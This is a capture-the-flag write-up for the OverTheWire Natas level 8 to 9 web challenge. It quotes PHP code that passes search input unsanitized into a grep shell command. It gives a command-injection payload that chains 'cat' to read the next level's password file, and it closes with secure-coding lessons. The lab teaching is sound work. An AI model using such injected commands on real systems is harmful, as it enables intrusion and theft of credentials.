---
title: "Level 8 -> Level 9"
description: "Exploit command injection in a grep wrapper to read the next level password."
date: 2026-09-11
platform: OverTheWire
game: Natas
level: "8 -> 9"
difficulty: Easy
category: Web
tags:
  - Web
  - PHP
  - Command Injection
  - Source Code
  - Beginner
---

## Challenge

Log in to Natas level 9 and locate the password for the next level.

```txt title="Credentials"
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
```

## Enumeration

The page shows a simple search form. We need to provide a word or substring to search for. 

The page also lets us inspect the source code:

```php title="Source code"
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

The application takes our `needle` input and inserts it directly into this shell command:

```sh title="Command built by the server"
grep -i $key dictionary.txt
```

If we search for `needle`, the page returns matching entries from `dictionary.txt`:

```txt title="Search result"
needle
needle's
needled
needles
needless
needlessly
needlework
needlework's
```

This confirms that our input is being passed to `grep`.

## Exploitation

Because the input is placed into a shell command without sanitization, we can inject another command. From earlier Natas levels, we know the next password is stored at:

```txt title="Password path"
/etc/natas_webpass/[natasLevel]
```

We can use `;` to end the `grep` command and run `cat` after it:

```txt title="Payload"
; cat /etc/natas_webpass/natas10
```

That produces the next level password, followed by extra output from the original command:

```txt title="Output"
[NextLevelPassword]
.
.
.
Other stuff
.
.
.
```

For cleaner output, add `#` at the end to comment out the rest of the command:

```txt title="Cleaner payload"
; cat /etc/natas_webpass/natas10 #
```

The output is now just the next password:

```txt title="Clean output"
[NextLevelPassword]
```

The real password is intentionally omitted from this public writeup. Run the steps above to retrieve it yourself.


## Lessons learned

:::tip[Key takeaways]

- Never pass unsanitized user input into shell commands.
- PHP's `passthru()` executes system commands, so input must be escaped or avoided entirely.
- Shell metacharacters like `;` can chain commands, and `#` can comment out the rest of a command.

:::
